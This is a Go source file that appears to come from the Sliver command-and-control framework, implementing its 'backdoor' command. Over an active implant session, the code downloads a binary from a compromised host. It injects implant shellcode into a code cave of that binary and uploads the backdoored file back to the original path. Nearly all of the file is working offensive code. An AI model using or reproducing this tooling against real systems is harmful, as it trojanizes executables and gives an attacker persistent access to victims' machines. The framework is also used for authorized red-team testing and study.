package command

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
	"github.com/desertbit/grumble"
	"github.com/moloch--/binjection/bj"
)

func binject(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		fmt.Println(Warn + "Please select an active session via `use`")
		return
	}

	if len(ctx.Args) < 1 {
		fmt.Println(Warn + "Please provide a remote file path. See `help backdoor` for more info")
		return
	}

	profileName := ctx.Flags.String("profile")
	remoteFilePath := ctx.Args[0]

	config := &bj.BinjectConfig{
		CodeCaveMode: true,
	}

	remoteFile, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Path:    remoteFilePath,
		Request: ActiveSession.Request(ctx),
	})

	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}
	if remoteFile.Encoder == "gzip" {
		remoteFile.Data, err = new(encoders.Gzip).Decode(remoteFile.Data)
		if err != nil {
			fmt.Printf(Warn+"Decoding failed %s", err)
			return
		}
	}

	profiles, err := rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
	if err != nil {
		fmt.Printf(Warn+"Error: %v\n", err)
		return
	}
	var p *clientpb.ImplantProfile
	for _, prof := range profiles.Profiles {
		if prof.Name == profileName {
			p = prof
		}
	}
	if p.GetName() == "" {
		fmt.Printf(Warn+"no profile found for name %s\n", profileName)
		return
	}

	shellcode, err := getSliverBinary(*p, rpc)
	newFile, err := bj.Binject(remoteFile.Data, shellcode, config)
	if err != nil {
		fmt.Printf(Warn+"Error: %v\n", err)
		return
	}
	uploadGzip := new(encoders.Gzip).Encode(newFile)
	// upload to remote target
	uploadCtrl := make(chan bool)
	go spin.Until("Uploading backdoored file ...", uploadCtrl)
	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    remoteFilePath,
		Request: ActiveSession.Request(ctx),
	})
	uploadCtrl <- true
	<-uploadCtrl
	if err != nil {
		fmt.Printf(Warn+"Error: %s\n", err)
		return
	}
	fmt.Printf(Info+"Uploaded backdoored binary to %s\n", upload.GetPath())

}
